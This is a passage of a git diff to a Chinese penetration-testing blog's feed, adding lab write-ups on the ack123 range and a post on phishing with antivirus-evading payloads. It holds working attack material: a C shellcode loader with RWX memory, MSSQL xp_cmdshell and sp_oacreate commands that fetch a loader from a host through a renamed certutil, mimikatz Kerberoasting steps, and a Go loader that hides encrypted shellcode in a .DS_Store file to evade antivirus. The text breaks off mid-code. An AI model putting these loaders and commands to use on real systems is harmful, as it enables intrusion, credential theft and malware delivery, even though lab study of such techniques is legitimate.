-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [binary string]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][i * <span class="number">2</span>], <span class="string">&quot;%2hhx&quot;</span>, &amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请内存（权限为rwx）</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="number">1024</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode复制进申请的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(exec, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>利用Visual Studio编译生成load.exe</p>
-<p>certutil 工具远程下载 loader.exe</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &quot;http://192.168.59.1/loader.exe&quot; C:\Windows\Temp\loader.exe&#x27;</span><br></pre></td></tr></table></figure>
-<p>xp_cmdshell 执行命令加载 shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;C:\Windows\Temp\loader.exe shellcode二进制木马‘</span><br></pre></td></tr></table></figure>
-<h1 id="kerberosting">kerberosting</h1>
-<p><code>Kerberoast </code>是一种针对 Kerberos 身份验证协议的攻击技术,用于从域控制器获取受保护的服务账户（Service Account）密码哈希值并进行破解</p>
-<p>流程如下：</p>
-<p><img src="image-20230430190501680.png" alt="image-20230430190501680"></p>
-<p>攻击者拿到ST用于本地离线爆破,如果字典足够强大则可以爆破出SPN链接用户的明文密码</p>
-<p>这个过程中,客户端在请求ST的时候是可以<code>协商所使用的加密算法</code>,只有使用的是<code>RC4加密</code>才有可能被爆破出来</p>
-<blockquote>
-<p>kerberosting一般只攻击注册下用户下的SPN,而机器账户的密码是随机生成的128位字符,不太可能爆破出来</p>
-</blockquote>
-<p>首先查询某个域中的SPN信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure>
-<blockquote>
-<ul>
-<li>setspn：setspn 是一个 Windows 命令行工具,用于管理和操作 Active Directory 中的 SPN 信息</li>
-<li>-T <a href="http://ack123.com">ack123.com</a>：指定要查询的域或计算机名称,例如 <a href="http://ack123.com">ack123.com</a> 表示查询该域中的 SPN 信息</li>
-<li>-q：指定要执行的操作类型,这里表示查询 SPN 信息。</li>
-<li><em>/</em>：指定要查询的所有 SPN 类型和名称,包括服务类别和实例名称。其中 * 表示通配符,表示任意字符或字符串</li>
-</ul>
-</blockquote>
-<p>SPN命令格式:<code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></p>
-<p>在web2中可以看到Administrator注册了一个mysql的SPN</p>
-<p><img src="image-20230430191030997.png" alt="image-20230430191030997"></p>
-<p>接下来使用mimikatz请求SPN的ST</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure>
-<p>导出当前票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
-<p>利用kerberoast.exe爆破即可成功获取Administrator的密码明文</p>
-<p>参考：</p>
-<p><a href="https://www.cnblogs.com/wkzb/p/15667624.html">渗透测试带防御的内网域（ack123靶场）</a></p>
-<p><a href="https://blog.csdn.net/qq_38850916/article/details/124801004">内网渗透、三层拓扑、红队考核靶场(ack123)</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/422937627">CS-Shellcode分析（一）</a></p>
-<p><a href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权</a></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1644,6 +1736,84 @@ impacket中有smbexec.py工具可以用来攻击<br>
       </tags>
   </entry>
   <entry>
+    <title>暗月ack靶场学习记录</title>
+    <url>/post/%E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>最近打了一套新的靶场——暗月ack,学到了很多新东西,特此记录</p>
+<h1 id="烂土豆（RottenPotato）">烂土豆（RottenPotato）</h1>
+<p><code>烂土豆（Rotten Potato） MS16-075</code> 是一种利用 Windows 客户端操作系统中 NT AUTHORITY\SYSTEM 权限漏洞的攻击方法,可以实现本地提权,对应的补丁号为<code>KB3164038</code></p>
+<p>适用版本：<code>Windows 7、8、10、2008、2012</code></p>
+<p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时,Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码</p>
+<p>若要利用此漏洞,攻击者首先必须登录系统。然后,攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序,从而控制受影响的系统,可见,该漏洞的利用方式还是比较简单的</p>
+<p>首先在拥有一个登录用户的情况下输入<code>whoami /prive</code>查看当前用户的权限</p>
+<p>如果发现有<code>SeAssignPrimaryTokenPrivilege</code>权限或者<code>SeImpersonatePrivilege</code> 权限并且系统未打对应的补丁则可以成功利用烂土豆提权</p>
+<h1 id="MSSQL拿shell">MSSQL拿shell</h1>
+<p>拿到sql server的<code>sa账户</code>以后可以通过<code>xp_cmdshell</code>来执行系统命令</p>
+<p>先判断xp_shell是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
+<p>如果显示0则可以通过以下命令重新加载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure>
+<p>执行命令方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>
+<p>在命令执行之后下一步的目标就是拿shell,这里采用的方法是利用windows自带的<code>certutil</code>下载shellcode加载器</p>
+<p>但是使用xp_cmdshell去调用certutil会发现被火绒拦截了,所以我们需要使用<code>sp_oacreate</code>来执行命令</p>
+<blockquote>
+<p><code>xp_cmdshell</code> 和 <code>sp_oacreate</code> 都是 SQL Server 中用于执行操作系统命令的工具,但是它们之间存在一些差异</p>
+<p><code>xp_cmdshell</code> 是在 SQL Server 上直接调用 Windows 的 <code>cmd.exe</code> 执行指定的命令,因此容易被杀毒软件和防火墙拦截。当执行 <code>xp_cmdshell</code> 命令时,如果杀毒软件或防火墙检测到其中包含有潜在的安全威胁,则可能会立即阻止该命令的执行</p>
+<p>相比之下,<code>sp_oacreate</code> 是使用 SQL Server 的 COM (组件对象模型) 接口创建一个外部对象,并通过该对象调用操作系统命令,因此在某种程度上可以绕过杀毒软件或防火墙的检测。但是,由于它需要使用 COM 对象,而且需要启用 <code>Ole Automation Procedures</code> 选项才能使用,因此在某些情况下可能不太方便使用</p>
+</blockquote>
+<p><code>sp_oacreate</code>可以删除、复制、移动文件,还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>,但是<code>sp_oamethod</code>无回显</p>
+<p>首先要开启<code>sp_oacreate</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+<p>将 certutil.exe 复制到 C:\Windows\Temp\ 下,并重命名为 sethc.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @o int; exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
+<p>生成cobalt strike 的shellcode加载器</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [binary string]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][i * <span class="number">2</span>], <span class="string">&quot;%2hhx&quot;</span>, &amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请内存（权限为rwx）</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="number">1024</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode复制进申请的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(exec, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用Visual Studio编译生成load.exe</p>
+<p>certutil 工具远程下载 loader.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &quot;http://192.168.59.1/loader.exe&quot; C:\Windows\Temp\loader.exe&#x27;</span><br></pre></td></tr></table></figure>
+<p>xp_cmdshell 执行命令加载 shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;C:\Windows\Temp\loader.exe shellcode二进制木马‘</span><br></pre></td></tr></table></figure>
+<h1 id="kerberosting">kerberosting</h1>
+<p><code>Kerberoast </code>是一种针对 Kerberos 身份验证协议的攻击技术,用于从域控制器获取受保护的服务账户（Service Account）密码哈希值并进行破解</p>
+<p>流程如下：</p>
+<p><img src="image-20230430190501680.png" alt="image-20230430190501680"></p>
+<p>攻击者拿到ST用于本地离线爆破,如果字典足够强大则可以爆破出SPN链接用户的明文密码</p>
+<p>这个过程中,客户端在请求ST的时候是可以<code>协商所使用的加密算法</code>,只有使用的是<code>RC4加密</code>才有可能被爆破出来</p>
+<blockquote>
+<p>kerberosting一般只攻击注册下用户下的SPN,而机器账户的密码是随机生成的128位字符,不太可能爆破出来</p>
+</blockquote>
+<p>首先查询某个域中的SPN信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>setspn：setspn 是一个 Windows 命令行工具,用于管理和操作 Active Directory 中的 SPN 信息</li>
+<li>-T <a href="http://ack123.com">ack123.com</a>：指定要查询的域或计算机名称,例如 <a href="http://ack123.com">ack123.com</a> 表示查询该域中的 SPN 信息</li>
+<li>-q：指定要执行的操作类型,这里表示查询 SPN 信息。</li>
+<li><em>/</em>：指定要查询的所有 SPN 类型和名称,包括服务类别和实例名称。其中 * 表示通配符,表示任意字符或字符串</li>
+</ul>
+</blockquote>
+<p>SPN命令格式:<code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></p>
+<p>在web2中可以看到Administrator注册了一个mysql的SPN</p>
+<p><img src="image-20230430191030997.png" alt="image-20230430191030997"></p>
+<p>接下来使用mimikatz请求SPN的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure>
+<p>导出当前票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+<p>利用kerberoast.exe爆破即可成功获取Administrator的密码明文</p>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/wkzb/p/15667624.html">渗透测试带防御的内网域（ack123靶场）</a></p>
+<p><a href="https://blog.csdn.net/qq_38850916/article/details/124801004">内网渗透、三层拓扑、红队考核靶场(ack123)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/422937627">CS-Shellcode分析（一）</a></p>
+<p><a href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权</a></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>恶意代码逃逸学习</title>
     <url>/post/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>在渗透的过程中会经常遇到对方机器安装了杀软的情况，这时就需要用到免杀技术，之前钓鱼邮件中提到的免杀是用GO写的，但我觉得这种东西还是更靠近计算机底层为好，正好这几天看了<a href="https://payloads.online">倾旋大佬的博客</a>，对于用c++来实现恶意代码逃逸学到了很多，特此记录</p>
@@ -1721,74 +1891,61 @@ impacket中有smbexec.py工具可以用来攻击<br>
       </tags>
   </entry>
   <entry>
-    <title>利用ipv6搭建一台服务器</title>
-    <url>/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器</p>
-<h3 id="硬件需求">硬件需求</h3>
-<p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p>
-<p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p>
-<p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="准备工作">准备工作</h3>
-<p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p>
-<p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p>
-<p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>下载balenaetcher将iso文件烧录至U盘中</p>
-<p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p>
-<p>可以以这个up主的视频作为参考</p>
-<p><a href="https://b23.tv/LeqXDBR">（上）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a><br>
-<a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p>
-<h3 id="安装系统">安装系统</h3>
-<p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p>
-<p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p>
-<p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p>
-<p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p>
-<h3 id="配置网络">配置网络</h3>
-<p>系统安装完成以后就要开始配置网络了，我采取的方法是在局域网内使用固定的ipv4地址，同时开启centos的ipv6地址</p>
-<p>首先使用ifconfig查看网卡名字和分配的ip地址，如果已经有ipv6和ipv4地址了就不用管了，如果没有就需要对网卡配置文件进行修改</p>
-<p>使用以下命令对网卡配置进行修改</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-网卡名字 <span class="comment">#打开网卡配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有ipv6则加上这么几句话</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启网卡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>弄好以后可以用外网ping一下看分配到的ipv6地址是否能够ping通</p>
-<p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p>
-<h3 id="获取域名">获取域名</h3>
-<p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p>
-<p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>记录类型选择<strong>AAAA表示ipv6地址</strong></p>
-<p>主机记录填写<strong>子域名名称</strong></p>
-<p>记录值填<strong>对应的ipv6地址</strong></p>
-<p>添加完后进行<strong>生效检测</strong>查看是否能够成功解析</p>
-<p><strong>DDNS</strong></p>
-<p>DDNS（Dynamic Domain Name Server，动态域名服务）是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p>
-<p>网上有很多如何使用DDNS的教程，这里我使用的是是一个大佬分享的python脚本（服务器要安装pyhton运行环境，可以直接下载一个宝塔，会自动安装pyhton3.6）</p>
-<p><a href="https://github.com/zeruns/-Python-aliddns_ipv4-ipv6">zeruns/-Python-aliddns_ipv4-ipv6: 阿里云域名ddns动态域名解析Python源码 (github.com)</a></p>
-<p>使用教程：<a href="https://blog.zeruns.tech/archives/507.html">Python实现阿里云域名DDNS支持ipv4和ipv6 - Zeruns’s Blog</a></p>
-<p>（可以先把自己在阿里云上的ipv6地址改成错误的，然后运行一次程序查看ipv6地址是否被修改回来了）</p>
-<p>接着通过linux中的crontab设置定时任务运行python脚本（我的这里似乎不能直接运行python，需要将用shell脚本运行python然后再用在crontab中定时shell脚本）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#ddns.sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/xxx  <span class="comment"># 写你自己py文件的文件夹</span></span><br><span class="line">/usr/bin/python3.6 aliddns.py &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>添加定时任务</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">0 */4 * * * /home/xxx/ddns.sh  <span class="comment">#这里要输入shell脚本的绝对位置</span></span><br><span class="line"><span class="comment">#我是设置的每4个小时运行一次脚本，大家可以根据自己的情况选择脚本的运行时间</span></span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>这样ipv6地址就和域名绑定起来了</p>
-<p>到此为止基本的搭建任务就结束了</p>
-<h3 id="一些不得不提的安全问题">一些不得不提的安全问题</h3>
-<p>我们一般访问自己的linux服务器都是通过ssh的方式访问的，而将ssh服务直接暴露出来会存在一定的安全风险，所以我们最好做一些安全措施来保护我们的服务器不被他人入侵</p>
-<p>1.使用密钥登录ssh而非使用密码登录，防止被他人暴力破解</p>
-<p>2.修改ssh服务的默认端口，ssh的默认端口是22，而网上很多端口扫描的工具都会将22端口作为端口进行扫描</p>
-<p>3.取消root登录</p>
-<p>4.使用knockd来隐藏端口（终极隐藏大法）</p>
-<p><a href="https://cloud.tencent.com/developer/article/1005328">knockd：CVM云主机的隐形斗篷 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
-<p>虽然这些操作很复杂，但我想告诉你网络安全真的很重要！！！</p>
-<p>（我的一个朋友之前就因为ssh密码被爆破而被入侵了……）</p>
+    <title>邮箱钓鱼学习</title>
+    <url>/post/%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p><code>邮箱钓鱼</code>是一种常见的网络攻击手段,它利用伪造的电子邮件来诱导目标用户点击恶意链接或附件,从而窃取敏感信息或执行恶意代码。在进行网络攻击的时候非常常见,毕竟资产最薄弱的部分依旧还是人。</p>
+<h1 id="制作免杀马">制作免杀马</h1>
+<p>邮箱钓鱼攻击的成功与否很大程度上取决于攻击者能否绕过目标系统的防御措施,如杀毒软件、防火墙、沙箱等。因此,学习如何制作免杀的恶意代码是提高邮箱钓鱼攻击效果的关键。</p>
+<p>目前网上有非常多能够帮助shellcode免杀的工具,也可以自己尝试写一写,这里以绕过360为目标</p>
+<p>参考<a href="https://www.freebuf.com/articles/endpoint/323789.html">云山雾隐的shellcode免杀入门文章</a>我们可以得到一个基础的免杀马</p>
+<p>大致原理是对shellcode进行<code>异或加密</code>再<code>base64编码</code>得到密文,然后再对密文进行解码同时加载到内存中,但这种方式同样容易被查杀（2023.6.2测试被杀）,所以我们可以分开写,弄两个文件,一个文件（文件名为.DS_Store）存放我们所加密的shellcode,另外一个可执行文件负责读取shellcode并加载到内存中</p>
+<p>shell.go代码如下：</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>,<span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">content, err := ioutil.ReadFile(<span class="string">&quot;.DS_Store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="type">string</span>(content)</span><br><span class="line"></span><br><span class="line">charcode := DD(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span 